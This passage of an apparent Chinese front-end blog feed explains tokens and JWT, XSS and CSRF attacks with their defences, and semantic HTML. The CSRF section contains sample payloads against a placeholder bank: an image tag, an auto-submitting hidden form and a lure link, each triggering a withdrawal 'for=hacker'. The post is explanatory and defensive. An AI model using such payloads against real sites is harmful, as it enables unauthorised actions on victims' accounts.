"data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/24/qJKIsK.png" alt="qJKIsK.png"></a></p><p>每一次请求都需要携带 <code>token</code>，需要把 token 放到 <strong>HTTP 的 Header 里</strong>。</p><p>基于 token 的用户认证是一种<strong>服务端无状态</strong>的认证方式，服务端<strong>不用存放 token 数据</strong>。</p><p>用<strong>解析token的计算时间换取 session 的存储空间</strong>，从而减轻服务器的压力。</p><h3 id="Refresh-Token"><a href="#Refresh-Token" class="headerlink" title="Refresh Token"></a>Refresh Token</h3><ul><li>另外一种 token——refresh token</li><li>refresh token 是专用于刷新 access token 的 token。如果没有 refresh token，也可以刷新 access token，但每次刷新都要用户输入登录用户名与密码，会很麻烦。有了 refresh token，可以减少这个麻烦，客户端直接用 refresh token 去更新 access token，无需用户进行额外的操作。</li></ul><p><a href="https://imgtu.com/i/qJKoqO"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/24/qJKoqO.png" alt="qJKoqO.png"></a></p><h2 id="Token-和-Session-的区别"><a href="#Token-和-Session-的区别" class="headerlink" title="Token 和 Session 的区别"></a>Token 和 Session 的区别</h2><ul><li>Session 是一种<strong>记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息</strong>。而 Token 是<strong>令牌</strong>，<strong>访问资源接口（API）时所需要的资源凭证</strong>。Token <strong>使服务端无状态化，不会存储会话信息。</strong></li><li>Session 和 Token 并不矛盾，作为身份认证 Token 安全性比 Session 好，因为每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。<strong>如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。</strong></li><li>所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 SessionID 的不可预测性，暂且认为是安全的。而 Token ，如果指的是 OAuth Token 或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对 App 。其目的是让某 App 有权利访问某用户的信息。这里的 Token 是唯一的。不可以转移到其它 App上，也不可以转到其它用户上。Session 只提供一种简单的认证，即只要有此 SessionID ，即认为有此 User 的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方 App。所以简单来说：<strong>如果你的用户数据可能需要和第三方共享，或者允许第三方调用 API 接口，用 Token 。如果永远只是自己的网站，自己的 App，用什么就无所谓了。</strong></li></ul><h2 id="什么是-JWT"><a href="#什么是-JWT" class="headerlink" title="什么是 JWT"></a>什么是 JWT</h2><ul><li>JSON Web Token（简称 JWT）是目前最流行的<strong>跨域认证</strong>解决方案。</li><li>是一种<strong>认证授权机制</strong>。</li><li>JWT 是为了在网络应用环境间<strong>传递声明</strong>而执行的一种基于 JSON 的开放标准（<a href="https://link.juejin.cn/?target=https://tools.ietf.org/html/rfc7519">RFC 7519</a>）。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。</li><li>可以使用 HMAC 算法或者是 RSA 的公/私秘钥对 JWT 进行签名。因为数字签名的存在，这些传递的信息是可信的。</li></ul><p><a href="https://imgtu.com/i/qJK5M6"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/24/qJK5M6.png" alt="qJK5M6.png"></a></p><h2 id="Token-和-JWT-的区别"><a href="#Token-和-JWT-的区别" class="headerlink" title="Token 和 JWT 的区别"></a>Token 和 JWT 的区别</h2><p><strong>相同：</strong></p><ul><li>都是访问资源的令牌</li><li>都可以记录用户的信息</li><li>都是使服务端无状态化</li><li>都是只有验证成功后，客户端才能访问服务端上受保护的资源</li></ul><p><strong>区别：</strong></p><p>使用token时，服务端不用存放token，而是解析token数据，然后用解析出来的数据再去数据库查询用户信息。使用jwt时，解析jwt出来的数据以及包含了用户信息，不用再查询数据库。</p><ul><li>Token：服务端验证客户端发送过来的 Token 时，还需要查询数据库获取用户信息，然后验证 Token 是否有效。</li><li>JWT： 将 Token 和 Payload 加密后存储于客户端，服务端只需要使用密钥解密进行校验（校验也是 JWT 自己实现的）即可，不需要查询或者减少查询数据库，因为 JWT 自包含了用户信息和加密的数据。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Cookie、Session、Token、JWT&quot;&gt;&lt;a href=&quot;#Cookie、Session、Token、JWT&quot; class=&quot;headerlink&quot; title=&quot;Cookie、Session、Token、JWT&quot;&gt;&lt;/a&gt;Cookie、Session</summary>
      
    
    
    
    <category term="计算机网络和浏览器" scheme="https://lesliewaong.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
    <category term="Cookie" scheme="https://lesliewaong.top/tags/Cookie/"/>
    
    <category term="Session" scheme="https://lesliewaong.top/tags/Session/"/>
    
    <category term="Token" scheme="https://lesliewaong.top/tags/Token/"/>
    
    <category term="JWT" scheme="https://lesliewaong.top/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>XSS和CSRF</title>
    <link href="https://lesliewaong.top/posts/5c76f87e.html"/>
    <id>https://lesliewaong.top/posts/5c76f87e.html</id>
    <published>2022-03-10T04:01:23.000Z</published>
    <updated>2022-03-25T14:08:26.394Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS和CSRF"><a href="#XSS和CSRF" class="headerlink" title="XSS和CSRF"></a>XSS和CSRF</h2><h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><h4 id="什么是-XSS"><a href="#什么是-XSS" class="headerlink" title="什么是 XSS"></a>什么是 XSS</h4><p><code>Cross-Site Scripting</code>（跨站脚本攻击）简称 XSS，是一种<strong>代码注入攻击</strong>。</p><p>攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如<code>Cookie</code>、<code>SessionID</code> 等，进而危害数据安全。</p><p>所以,网页上哪些部分会引起XSS攻击?简单来说,任何可以输入的地方都有可能引起,包括URL!</p><p>XSS 常见的注入方法：</p><ul><li>在 HTML 中内嵌的文本中，恶意内容以 <code>script</code> 标签形成注入。</li><li>在<strong>内联的 JavaScript</strong> 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li><li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li><li>在标签的 href、src 等属性中，包含 <code>javascript:</code> (伪协议)等可执行代码。</li><li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li><li>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</li><li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li></ul><h4 id="XSS-攻击的分类"><a href="#XSS-攻击的分类" class="headerlink" title="XSS 攻击的分类"></a>XSS 攻击的分类</h4><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p><h5 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h5><p>存储型 XSS 的攻击步骤：</p><ol><li>攻击者将恶意代码提交到目标网站的数据库中。</li><li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>存储型 XSS(又被称为持久性XSS)攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p><p>它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为<strong>它不需要用户手动触发</strong>。<strong>任何允许用户存储数据的web程序都可能存在存储型XSS漏洞</strong>，当攻击者提交一段XSS代码后，被服务器端接收并存储，当<strong>所有浏览者访问某个页面时都会被XSS</strong>。</p><h5 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h5><p>反射型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p><p>反射型 XSS (也被称为非持久性XSS)漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p><h5 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h5><p>DOM 型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL。</li><li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><p><strong>注意:</strong><br> DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS<strong>靠的是浏览器端的DOM解析</strong>，所以防范**DOM型XSS完全就是前端的责任,必须注意!!!**。</p><p><strong>对比:</strong></p><table><thead><tr><th>类型</th><th>存储区</th><th>插入点</th></tr></thead><tbody><tr><td>存储型 XSS</td><td>后端数据库</td><td>HTML</td></tr><tr><td>反射型 XSS</td><td>URL</td><td>HTML</td></tr><tr><td>DOM 型 XSS</td><td>后端数据库/前端存储/URL</td><td>前端 JavaScript</td></tr></tbody></table><h4 id="防御XSS"><a href="#防御XSS" class="headerlink" title="防御XSS"></a>防御XSS</h4><p>只要有输入数据的地方，就可能存在 XSS 危险。</p><h5 id="常用防范方法"><a href="#常用防范方法" class="headerlink" title="常用防范方法"></a>常用防范方法</h5><ul><li><strong>httpOnly:</strong> 在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息。</li><li><strong>输入过滤:</strong> 一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。不仅仅是前端负责，后端也要做相同的过滤检查。因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。</li><li><strong>转义 HTML:</strong> 如果拼接 HTML 是必要的，就需要对于引号，尖括号，斜杠进行转义,但这还不是很完善。想对 HTML 模板各处插入点进行充分的转义,就需要采用合适的转义库。</li><li><strong>白名单:</strong> 对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。这种情况通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。</li></ul><h5 id="预防存储型和反射型-XSS-攻击"><a href="#预防存储型和反射型-XSS-攻击" class="headerlink" title="预防存储型和反射型 XSS 攻击"></a>预防存储型和反射型 XSS 攻击</h5><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p><p>预防这两种漏洞，有两种常见做法：</p><ul><li>改成纯前端渲染，把代码和数据分隔开。</li><li>对 HTML 做充分转义。</li></ul><p>HTML转义前面已经说过,这里仅仅谈谈纯前端渲染</p><p><strong>纯前端渲染的过程：</strong></p><ol><li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li><li>然后浏览器执行 HTML 中的 JavaScript。</li><li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li></ol><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p><p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题,这时就需要对HTML进行充分的转义。</p><h5 id="预防-DOM-型-XSS-攻击"><a href="#预防-DOM-型-XSS-攻击" class="headerlink" title="预防 DOM 型 XSS 攻击"></a>预防 DOM 型 XSS 攻击</h5><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><h3 id="CSRF-跨站点请求伪造"><a href="#CSRF-跨站点请求伪造" class="headerlink" title="CSRF 跨站点请求伪造"></a>CSRF 跨站点请求伪造</h3><h4 id="什么是-CSRF"><a href="#什么是-CSRF" class="headerlink" title="什么是 CSRF"></a>什么是 CSRF</h4><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。</p><p>如:攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><h4 id="CSRF攻击流程"><a href="#CSRF攻击流程" class="headerlink" title="CSRF攻击流程"></a>CSRF攻击流程</h4><p><a href="https://imgtu.com/i/HLcNVO"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/02/20/HLcNVO.png" alt="HLcNVO.png"></a></p><p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><ul><li>1.登录受信任网站A，并在本地生成Cookie。</li><li>2.在不登出A的情况下，访问危险网站B。</li></ul><p>看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：</p><ul><li>你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</li><li><strong>你不能保证你关闭浏览器了后，你本地的Cookie立刻过期</strong>，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了……）</li><li>上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</li></ul><h4 id="常见的CSRF攻击类型"><a href="#常见的CSRF攻击类型" class="headerlink" title="常见的CSRF攻击类型"></a>常见的CSRF攻击类型</h4><ul><li><h4 id="GET类型的CSRF"><a href="#GET类型的CSRF" class="headerlink" title="GET类型的CSRF"></a>GET类型的CSRF</h4></li></ul><p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.example/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span> </span><br></pre></td></tr></table></figure><p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p><ul><li><h4 id="POST类型的CSRF"><a href="#POST类型的CSRF" class="headerlink" title="POST类型的CSRF"></a>POST类型的CSRF</h4></li></ul><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.example/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p><p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，<strong>后端接口不能将安全寄托在仅允许POST上面</strong>。</p><ul><li><h4 id="链接类型的CSRF"><a href="#链接类型的CSRF" class="headerlink" title="链接类型的CSRF"></a>链接类型的CSRF</h4></li></ul><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">重磅消息！！</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="CSRF的特点"><a href="#CSRF的特点" class="headerlink" title="CSRF的特点"></a>CSRF的特点</h4><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击<strong>利用受害者在被攻击网站的登录凭证，冒充受害者提交操作</strong>；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li><li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul><p>CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如<strong>可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</strong></p><h4 id="CSRF与-XSS-区别"><a href="#CSRF与-XSS-区别" class="headerlink" title="CSRF与 XSS 区别"></a>CSRF与 XSS 区别</h4><ul><li><strong>通常来说 CSRF 是由 XSS 实现的，CSRF 时常也被称为 XSRF（CSRF 实现的方式还可以是直接通过命令行发起请求等）。</strong></li><li>本质上讲，XSS 是代码注入问题，<strong>CSRF 是 HTTP 问题。</strong> XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行。<strong>CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie里面(Token验证可以避免)。</strong></li></ul><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul><li>验证码；强制用户必须与应用进行交互，才能完成最终请求。此种方式能很好的遏制 CSRF，但是用户体验比较差。</li><li>Referer check；请求来源限制，此种方法成本最低，但是并不能保证 100% 有效，因为服务器并不是什么时候都能取到 Referer，而且低版本的浏览器存在伪造 Referer 的风险。</li><li>token；<strong>token 验证的 CSRF 防御机制是公认最合适的方案。</strong>若网站同时存在 XSS 漏洞的时候，这个方法也是空谈。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XSS和CSRF&quot;&gt;&lt;a href=&quot;#XSS和CSRF&quot; class=&quot;headerlink&quot; title=&quot;XSS和CSRF&quot;&gt;&lt;/a&gt;XSS和CSRF&lt;/h2&gt;&lt;h3 id=&quot;XSS攻击&quot;&gt;&lt;a href=&quot;#XSS攻击&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="浏览器" scheme="https://lesliewaong.top/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
    <category term="XSS" scheme="https://lesliewaong.top/tags/XSS/"/>
    
    <category term="CSRF" scheme="https://lesliewaong.top/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>HTML语义化</title>
    <link href="https://lesliewaong.top/posts/bb028bb1.html"/>
    <id>https://lesliewaong.top/posts/bb028bb1.html</id>
    <published>2022-03-04T03:14:22.000Z</published>
    <updated>2022-03-25T14:08:26.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML语义化"><a href="#HTML语义化" class="headerlink" title="HTML语义化"></a>HTML语义化</h1><blockquote><p>良好的语义化代码可以直接从代码上就能看出来那一块到底是要表达什么内容。</p></blockquote><p><strong>语义化</strong>，指对<strong>文本内容的结构化（内容语义化）</strong>，<strong>选择合乎语义的标签（代码语义化）</strong>，便于<strong>开发者阅读</strong>，<strong>维护和写出更优雅的代码的同时，让浏览器的爬虫和辅助技术更好的解析。</strong></p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li><p>标签语义化有助于构架良好的HTML结构（让页面的内容<strong>结构化</strong>）</p></li><li><p><strong>有利于SEO</strong>：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重。</p></li><li><p><strong>有利于不同设备的解析</strong>（屏幕阅读器，盲人阅读器等）。</p><p>满是div的页面这些设备如何区分那些是主要内容优先阅读？</p></li><li><p>清晰的结构<strong>有利于团队的开发和维护</strong>。</p></li><li><p>在没有样式CSS情况下也以一种文档格式显示，并且是容易阅读的。</p></li></ul><h1 id="常用的一些语义化标签"><a href="#常用的一些语义化标签" class="headerlink" title="常用的一些语义化标签"></a>常用的一些语义化标签</h1><ul><li><p><code>&lt;h1&gt;</code>~`<h6><code> ，作为**标题**使用，并且依据重要性递减，</code><h1>` 是最高的等级。</p></li><li><p><code>&lt;p&gt;</code><strong>段落</strong>标记，知道了 <code>&lt;p&gt;</code> 作为段落，你就不会再使用 <code>&lt;br/&gt;</code> 来换行了，而且不需要 <code>&lt;br/&gt;</code> 来区分段落与段落。</p><p><code>&lt;p&gt;</code> 中的文字会自动换行，而且换行的效果优于 <code>&lt;br /&gt;</code>。</p><p>段落与段落之间的空隙也可以利用 <strong>CSS</strong> 来控制，很容易而且清晰的区分出段落与段落。</p></li><li><p><code>&lt;ul&gt;</code>、<code>&lt;ol&gt;</code>、<code>&lt;li&gt;</code>，</p><p><code>&lt;ul&gt;</code> 无序列表，这个被大家广泛的使用，<code>&lt;ol&gt;</code> 有序列表不常用。在 Web 标准化过程中，<code>&lt;ul&gt;</code> 还被更多的用于导航条，本来导航条就是个列表，这样做是完全正确的，而且当你的浏览器不支持 CSS 的时候，导航链接仍然很好使，只是美观方面差了一点而已。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>结构<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>表现<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>行为<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>结构<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>表现<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>行为<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>&lt;dl&gt;</code>、<code>&lt;dt&gt;</code>、<code>&lt;dd&gt;</code>，</p><p><code>&lt;dl&gt;</code> 就是“定义列表”。比如说词典里面的词的解释、定义就可以用这种列表。</p><p><strong>dl不单独使用，它通常与dt和dd一起使用。dl开启一个定义列表，dt表示要定义的项目名称，dd表示对dt的项目的描述。</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>结构<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>&lt;em&gt;</code>、<code>&lt;strong&gt;</code>，<code>&lt;em&gt;</code> 是用作强调，<code>&lt;strong&gt;</code> 是用作重点强调。</p></li><li><p><code>&lt;table&gt;</code>、<code>&lt;thead&gt;</code>、<code>&lt;tbody&gt;</code>、<code>&lt;td&gt;</code>、<code>&lt;th&gt;</code>、<code>&lt;caption&gt;</code>， 就是<strong>用来做表格不要用来布局</strong>。</p></li></ul><h2 id="被滥用的语义化标签"><a href="#被滥用的语义化标签" class="headerlink" title="被滥用的语义化标签"></a>被滥用的语义化标签</h2><p>以下是一些广泛被滥用的语义化标签：</p><ol><li><p><code>blockquote</code>：一些人通过使用<code>&lt;blockquote&gt;</code>标签使文本达到缩进的目的，因为引用默认会进行文本缩进。如果你仅仅是想使文本达到缩进目的，而文本自身并非引用，那么就用<code>CSS</code> <code>margin</code>来代替；<strong>blockquote标签：</strong>表示一个长引用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span>这句话我是从来没有说过的！<span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>p</code>：一些开发者用<code>&lt;p&gt; 